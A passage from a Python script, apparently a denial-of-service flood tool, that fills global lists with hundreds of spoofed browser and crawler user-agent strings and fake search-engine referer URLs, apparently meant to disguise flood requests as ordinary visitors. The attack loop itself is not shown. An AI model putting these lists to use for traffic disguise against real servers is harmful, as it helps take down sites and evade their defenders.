        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
    headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
    headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
    headers_useragents.append(
        'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
    headers_useragents.append(
        'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
    headers_useragents.append(
        'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
    headers_useragents.append(
        'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
    headers_useragents.append(
        'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    headers_useragents.append(
        'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    return (headers_useragents)

# generates a referer array


def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append(
        'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
    headers_referers.append('http://vk.com/profile.php?redirect=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append(
        'http://engadget.search.aol.com/search?q=query?=query=..')
    headers_referers.append(
        'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
    headers_referers.append(
        'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
    headers_referers.append('http://yandex.ru/yandsearch?text=')
    headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
    headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
    headers_referers.append(
        'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
    headers_referers.append(
        'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
    headers_referers.append(
        'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
    headers_referers.append(
        'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
    headers_referers.append(
        'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
    headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
    headers_referers.append(
        'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
    headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
    headers_referers.append('http://help.baidu.com/searchResult?keywords=')
    headers_useragents.append(
        'Googlebot/2.1 (http://www.googlebot.com/bot.html)')
    headers_useragents.append(
        'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
    headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
    headers_useragents.append('(Privoxy/1.0)')
    headers_useragents.append('*/Nutch-0.9-dev')
    headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
    headers_useragents.append(
        '-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')
    headers_useragents.append(
        '123spider-Bot (Version: 1.02) powered by www.123spider.de')
    headers_useragents.append('192.comAgent')
    headers_useragents.append(
        '1st ZipCommander (Net) - http://www.zipcommander.com/')
    headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')
    headers_useragents.append('4anything.com LinkChecker v2.0')
    headers_useragents.append('8484 Boston Project v 1.0')
    headers_useragents.append(
        ':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )')
    headers_useragents.append('A-Online Search')
    headers_useragents.append(
        'A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')
    headers_useragents.append(
        'A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')
    headers_useragents.append('AbachoBOT')
    headers_useragents.append('AbachoBOT (Mozilla compatible)')
    headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')
    headers_useragents.append(
        'Aberja Checkomat 	Aberja Hybridsuchmaschine (Germany)')
    headers_useragents.append(
        'abot/0.1 (abot; http://www.abot.com; abot@abot.com)')
    headers_useragents.append('About/0.1libwww-perl/5.47')
    headers_useragents.append('Accelatech RSSCrawler/0.4')
    headers_useragents.append('accoona 	Accoona Search robot')
    headers_useragents.append(
        'Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')
    headers_useragents.append(
        'Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')
    headers_useragents.append('Ace Explorer')
    headers_useragents.append('Ack (http://www.ackerm.com/)')
    headers_useragents.append('AcoiRobot')
    headers_useragents.append('Acoon Robot v1.50.001')
    headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')
    headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')
    headers_useragents.append(
        'Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')
    headers_useragents.append(
        'Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')
    headers_useragents.append('ActiveBookmark 1.x')
    headers_useragents.append('Activeworlds')
    headers_useragents.append('ActiveWorlds/3.xx (xxx)')
    headers_useragents.append(
        'AnnoMille spider 0.1 alpha - http://www.annomille.it')
    headers_useragents.append(
        'annotate_google; http://ponderer.org/download/annotate_google.user.js')
    headers_useragents.append(
        'Anonymized by ProxyOS: http://www.megaproxy.com')
    headers_useragents.append('Anonymizer/1.1')
    headers_useragents.append('AnswerBus (http://www.answerbus.com/)')
    headers_useragents.append('AnswerChase PROve x.0')
    headers_useragents.append('AnswerChase x.0')
    headers_useragents.append('ANTFresco/x.xx')
    headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')
    headers_useragents.append(
        'AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')
    headers_useragents.append('Apexoo Spider 1.x')
    headers_useragents.append('Aplix HTTP/1.0.1')
    headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')
    headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')
    headers_useragents.append('Aport')
    headers_useragents.append('appie 1.1 (www.walhello.com)')
    headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')
    headers_useragents.append('Apple-PubSub/65.1.1')
    headers_useragents.append(
        'ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')
    headers_useragents.append('ArachBot')
    headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
